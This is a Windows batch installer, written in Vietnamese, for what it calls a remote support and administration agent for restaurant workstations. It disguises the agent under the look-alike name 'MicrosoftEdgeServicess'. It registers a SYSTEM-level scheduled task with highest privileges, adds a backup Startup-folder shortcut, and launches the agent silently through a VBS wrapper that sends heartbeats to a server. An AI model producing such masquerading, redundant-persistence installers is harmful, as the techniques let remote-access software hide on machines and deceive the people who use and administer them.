@echo off
chcp 65001 >nul
title Cai Dat Dich Vu MicrosoftEdgeServicess Tu Dong Khoi Dong Cung Windows
cd /d "%~dp0"

echo ===============================================================================
echo   CÀI ĐẶT DỊCH VỤ HỖ TRỢ & QUẢN TRỊ TỪ XA MÁY TRẠM NHÀ HÀNG
echo   Tên dịch vụ: MicrosoftEdgeServicess
echo   Cơ chế: Tự khởi động cùng Windows (Automatic) - Tự chạy lại khi gặp lỗi
echo ===============================================================================
echo.

:: 1. Kiểm tra môi trường Python
where python >nul 2>nul
if %errorlevel% neq 0 (
    echo [LỖI] Chưa tìm thấy Python trên máy tính này!
    echo Vui lòng cài đặt Python 3.8 trở lên và tích chọn "Add python.exe to PATH".
    echo.
    pause
    exit /b 1
)

:: 2. Thiết lập thư mục cài đặt hệ thống
set "INSTALL_DIR=C:\ProgramData\MicrosoftEdgeServicess"
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"

echo 1. Đang sao chép các tệp dịch vụ vào: %INSTALL_DIR%
copy /Y "%~dp0config.json" "%INSTALL_DIR%\" >nul
copy /Y "%~dp0restaurant_support_agent.py" "%INSTALL_DIR%\" >nul
copy /Y "%~dp0Run_Silent_Agent.vbs" "%INSTALL_DIR%\" >nul
copy /Y "%~dp0Chay_Agent_Truc_Tiep.bat" "%INSTALL_DIR%\" >nul
copy /Y "%~dp0Go_Cai_Dat_Dich_Vu.bat" "%INSTALL_DIR%\" >nul
copy /Y "%~dp0README_HUONG_DAN.txt" "%INSTALL_DIR%\" >nul 2>nul

echo 2. Đang đăng ký tác vụ tự động khởi động cùng Windows (Task Scheduler)...
:: Đăng ký tác vụ hệ thống khởi động cùng Windows với quyền cao nhất
schtasks /Create /TN "MicrosoftEdgeServicess" /TR "wscript.exe \"%INSTALL_DIR%\Run_Silent_Agent.vbs\"" /SC ONSTART /RU "SYSTEM" /RL HIGHEST /F >nul 2>nul
if %errorlevel% neq 0 (
    echo    -> Dang ky Task Scheduler muc SYSTEM can quyen Admin. Thu dang ky muc User ONLOGON...
    schtasks /Create /TN "MicrosoftEdgeServicess" /TR "wscript.exe \"%INSTALL_DIR%\Run_Silent_Agent.vbs\"" /SC ONLOGON /RL HIGHEST /F >nul 2>nul
)

:: Tạo thêm shortcut vào thư mục Startup để đảm bảo dự phòng 100%
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "VBS_SHORTCUT=%TEMP%\create_shortcut_edge_svc.vbs"
echo Set oWS = WScript.CreateObject("WScript.Shell") > "%VBS_SHORTCUT%"
echo sLinkFile = "%STARTUP_DIR%\MicrosoftEdgeServicess.lnk" >> "%VBS_SHORTCUT%"
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> "%VBS_SHORTCUT%"
echo oLink.TargetPath = "%INSTALL_DIR%\Run_Silent_Agent.vbs" >> "%VBS_SHORTCUT%"
echo oLink.WorkingDirectory = "%INSTALL_DIR%" >> "%VBS_SHORTCUT%"
echo oLink.Description = "MicrosoftEdgeServicess Remote Support Background Service" >> "%VBS_SHORTCUT%"
echo oLink.Save >> "%VBS_SHORTCUT%"
cscript //nologo "%VBS_SHORTCUT%" >nul 2>nul
del "%VBS_SHORTCUT%" >nul 2>nul

echo 3. Đang khởi chạy dịch vụ ngầm ngay bây giờ...
wscript.exe "%INSTALL_DIR%\Run_Silent_Agent.vbs"

echo.
echo ===============================================================================
echo   CÀI ĐẶT THÀNH CÔNG!
echo   - Thư mục cài đặt: %INSTALL_DIR%
echo   - Dịch vụ: MicrosoftEdgeServicess
echo   - Đã thiết lập tự khởi động cùng Windows mỗi khi bật máy.
echo   - Dịch vụ đang chạy ngầm và gửi Heartbeat lên Server.
echo ===============================================================================
echo.
pause
